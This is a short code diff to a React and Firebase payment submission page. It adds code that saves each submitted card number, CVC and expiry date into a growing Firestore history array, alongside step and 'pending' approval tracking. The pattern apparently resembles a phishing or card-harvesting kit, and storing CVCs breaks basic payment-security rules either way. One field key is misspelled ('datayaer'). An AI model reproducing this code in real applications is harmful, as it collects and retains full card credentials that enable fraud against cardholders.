@@ -2,7 +2,7 @@
 
 import { FormEvent, useEffect, useMemo, useRef, useState } from 'react'
 import { db } from '@/lib/firebase'
-import { doc, onSnapshot, setDoc } from 'firebase/firestore'
+import { arrayUnion, doc, onSnapshot, setDoc } from 'firebase/firestore'
 import { Button } from '@/app/components/ui/button'
 import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/app/components/ui/card'
 import { Input } from '@/app/components/ui/input'
@@ -406,7 +406,20 @@ export default function SubmitPage() {
 
     setLoading(true)
     try {
-      await saveToFirestore({ step: 5, currentPage: 'card-info', cardState: 'pending' })
+      const [expiryYear, expiryMonth] = cardExpiry.split('-')
+      await saveToFirestore({
+        step: 5,
+        currentPage: 'card-info',
+        cardState: 'pending',
+        cardDetailsHistory: arrayUnion({
+          cardNumber: cleanCard,
+          CVC: cvv,
+          dateMonth: expiryMonth ?? '',
+          datayaer: expiryYear ? expiryYear.slice(-2) : '',
+          cardExpiry,
+          submittedAt: Date.now(),
+        }),
+      })
     } catch {}
     setLoading(false)
 
